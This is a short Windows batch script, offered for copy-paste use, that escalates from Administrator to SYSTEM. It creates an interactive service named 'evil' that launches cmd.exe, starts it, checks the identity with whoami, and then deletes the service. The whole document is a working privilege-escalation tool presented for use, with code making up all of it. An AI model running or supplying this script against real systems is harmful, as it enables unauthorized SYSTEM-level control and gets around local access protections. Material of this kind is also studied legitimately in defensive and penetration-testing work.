:::: Elevate form Admin to System on windows with started service
:::: Copy and paste to sys.bat and right click, Run as Admin
:::: Will need to be run in GUI, starts cmd window in new screen as system user!!

@echo off
@break off
title root
cls

:::: Hit enter once, then click the "View the message" prompt
sc create evil binpath= "cmd.exe /K start" type= own type= interact > nul 2>&1
pause
sc start evil > nul 2>&1
pause
whoami
pause
rem ping 127.0.0.1 -n 4 > nul 2>&1
echo Removing service.
echo.
sc delete evil > nul 2>&1
